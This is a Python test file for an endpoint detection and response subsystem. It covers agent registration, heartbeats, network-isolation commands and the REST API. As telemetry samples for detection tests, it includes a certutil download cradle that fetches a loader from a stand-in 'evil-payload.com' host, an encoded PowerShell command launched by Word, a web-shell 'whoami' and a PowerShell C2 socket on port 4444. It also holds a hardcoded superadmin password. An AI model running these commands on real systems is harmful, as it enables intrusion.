"""Unit & Integration Tests for Endpoint Detection & Response (EDR) Subsystem."""

import pytest
import pytest_asyncio
from httpx import AsyncClient, ASGITransport

from cybershield.api.server import app
from cybershield.edr.behavior_engine import EDRBehaviorEngine
from cybershield.edr.manager import edr_manager
from cybershield.edr.schemas import (
    AgentStatus,
    EDRAgentRegistrationRequest,
    EDRCommandAction,
    EDRHeartbeatRequest,
    EDRTelemetryBatchRequest,
    FIMTelemetryEvent,
    NetworkSocketEvent,
    OSPlatform,
    ProcessTelemetryEvent,
)


def test_edr_agent_registration():
    """Verify endpoint agent registration and token generation."""
    req = EDRAgentRegistrationRequest(
        hostname="ws-sales-01.corp",
        os_platform=OSPlatform.WINDOWS,
        os_version="Windows 10 Pro 22H2",
        architecture="x86_64",
        ip_addresses=["192.168.10.45"],
        mac_addresses=["00:11:22:33:44:55"],
        agent_version="2.4.0",
    )
    resp = edr_manager.register_agent(req)
    assert resp.agent_id.startswith("AGT-")
    assert resp.auth_token.startswith("agt_sec_")
    assert resp.heartbeat_interval_sec == 15

    agent_record = edr_manager.get_agent(resp.agent_id)
    assert agent_record is not None
    assert agent_record["hostname"] == "ws-sales-01.corp"
    assert agent_record["status"] == "ONLINE"


def test_edr_agent_heartbeat_and_command_delivery():
    """Verify queueing commands and delivering them via heartbeat."""
    # Register agent
    reg = edr_manager.register_agent(
        EDRAgentRegistrationRequest(
            hostname="srv-db-backup.corp",
            os_platform=OSPlatform.LINUX,
            os_version="RHEL 9.2",
        )
    )
    agent_id = reg.agent_id

    # Queue an isolation command
    cmd = edr_manager.queue_command(
        agent_id=agent_id,
        action=EDRCommandAction.ISOLATE_NETWORK,
        target=agent_id,
        parameters={"reason": "Suspected lateral movement"},
    )
    assert cmd is not None
    assert cmd.status == "PENDING"

    # Heartbeat
    hb_req = EDRHeartbeatRequest(
        agent_id=agent_id,
        status=AgentStatus.ONLINE,
        cpu_usage_pct=24.5,
        memory_usage_pct=48.2,
        disk_usage_pct=62.0,
    )
    hb_resp = edr_manager.process_heartbeat(hb_req)
    assert hb_resp.status == "ACK"
    assert len(hb_resp.pending_commands) == 1
    delivered_cmd = hb_resp.pending_commands[0]
    assert delivered_cmd.action == EDRCommandAction.ISOLATE_NETWORK
    assert delivered_cmd.status == "DISPATCHED"


def test_edr_behavior_office_spawning_shell():
    """Verify detection of weaponized Office macro spawning PowerShell."""
    engine = EDRBehaviorEngine()
    events = [
        ProcessTelemetryEvent(
            pid=4820,
            ppid=2210,
            process_name="powershell.exe",
            image_path="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            command_line="powershell.exe -enc SQBFAFgA...",
            parent_process_name="WINWORD.EXE",
            parent_command_line='"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" invoice.docm',
        )
    ]
    alerts = engine.analyze_processes("AGT-TEST-01", "ws-exec", events)
    assert len(alerts) >= 1
    assert any("Weaponized Office" in a.title for a in alerts)
    assert alerts[0].severity == "CRITICAL"
    assert alerts[0].mitre_technique == "T1204.002"


def test_edr_behavior_webshell():
    """Verify detection of web server spawning interactive shell."""
    engine = EDRBehaviorEngine()
    events = [
        ProcessTelemetryEvent(
            pid=7890,
            ppid=1200,
            process_name="cmd.exe",
            image_path="C:\\Windows\\System32\\cmd.exe",
            command_line="cmd.exe /c whoami /all",
            parent_process_name="w3wp.exe",
        )
    ]
    alerts = engine.analyze_processes("AGT-TEST-02", "srv-web", events)
    assert len(alerts) >= 1
    assert any("Webshell" in a.title for a in alerts)


def test_edr_behavior_lolbin():
    """Verify detection of CertUtil download cradle."""
    engine = EDRBehaviorEngine()
    events = [
        ProcessTelemetryEvent(
            pid=3456,
            ppid=1000,
            process_name="certutil.exe",
            image_path="C:\\Windows\\System32\\certutil.exe",
            command_line="certutil.exe -urlcache -split -f http://evil-payload.com/loader.exe C:\\temp\\loader.exe",
        )
    ]
    alerts = engine.analyze_processes("AGT-TEST-03", "ws-dev", events)
    assert len(alerts) >= 1
    assert any("CertUtil" in a.title for a in alerts)


def test_edr_fim_critical_file():
    """Verify detection of sensitive system file modification."""
    engine = EDRBehaviorEngine()
    events = [
        FIMTelemetryEvent(
            file_path="/etc/shadow",
            operation="MODIFIED",
            sha256_before="aaaabbbbccccdddd",
            sha256_after="eeeeffff11112222",
            user="attacker",
        )
    ]
    alerts = engine.analyze_fim("AGT-TEST-04", "srv-linux-prod", events)
    assert len(alerts) >= 1
    assert any("Critical Security File Altered" in a.title for a in alerts)


def test_edr_network_socket_c2():
    """Verify detection of command shell establishing external C2 connection."""
    engine = EDRBehaviorEngine()
    events = [
        NetworkSocketEvent(
            protocol="TCP",
            local_ip="10.0.1.50",
            local_port=49210,
            remote_ip="198.51.100.22",
            remote_port=4444,
            state="ESTABLISHED",
            pid=2040,
            process_name="powershell.exe",
        )
    ]
    alerts = engine.analyze_network_sockets("AGT-TEST-05", "ws-finance", events)
    assert len(alerts) >= 1
    assert any("Connected to External C2 IP" in a.title for a in alerts)


@pytest.mark.asyncio
async def test_edr_api_endpoints():
    """Verify REST API endpoints for agent registration, heartbeat, telemetry, commands."""
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as ac:
        # 1. Register agent
        reg_resp = await ac.post(
            "/api/edr/agents/register",
            json={
                "hostname": "ws-api-endpoint.corp",
                "os_platform": "WINDOWS",
                "os_version": "Windows 11",
            },
        )
        assert reg_resp.status_code == 200
        reg_data = reg_resp.json()
        agent_id = reg_data["agent_id"]

        # 2. Agent Heartbeat
        hb_resp = await ac.post(
            f"/api/edr/agents/{agent_id}/heartbeat",
            json={
                "agent_id": agent_id,
                "status": "ONLINE",
                "cpu_usage_pct": 12.0,
                "memory_usage_pct": 34.0,
                "disk_usage_pct": 50.0,
            },
        )
        assert hb_resp.status_code == 200
        assert hb_resp.json()["status"] == "ACK"

        # 3. Ingest Telemetry
        tel_resp = await ac.post(
            f"/api/edr/agents/{agent_id}/telemetry",
            json={
                "agent_id": agent_id,
                "processes": [
                    {
                        "pid": 5000,
                        "ppid": 100,
                        "process_name": "cmd.exe",
                        "image_path": "C:\\Windows\\System32\\cmd.exe",
                        "command_line": "cmd.exe",
                        "parent_process_name": "winword.exe",
                    }
                ],
            },
        )
        assert tel_resp.status_code == 200
        alerts = tel_resp.json()
        assert len(alerts) >= 1

        # 4. Authenticate for admin endpoints
        login_resp = await ac.post(
            "/api/auth/login",
            json={"username_or_email": "superadmin", "password": "CyberShield2026!"},
        )
        token = login_resp.json()["access_token"]
        headers = {"Authorization": f"Bearer {token}"}

        # 5. List Agents
        list_resp = await ac.get("/api/edr/agents", headers=headers)
        assert list_resp.status_code == 200
        assert len(list_resp.json()) >= 1

        # 6. Dispatch Command
        cmd_resp = await ac.post(
            f"/api/edr/agents/{agent_id}/commands",
            json={
                "action": "ISOLATE_NETWORK",
                "target": agent_id,
                "parameters": {"reason": "Test Containment"},
            },
            headers=headers,
        )
        assert cmd_resp.status_code == 200
        assert cmd_resp.json()["action"] == "ISOLATE_NETWORK"

        # 7. List Alerts
        alerts_resp = await ac.get("/api/edr/alerts", headers=headers)
        assert alerts_resp.status_code == 200
        assert len(alerts_resp.json()) >= 1
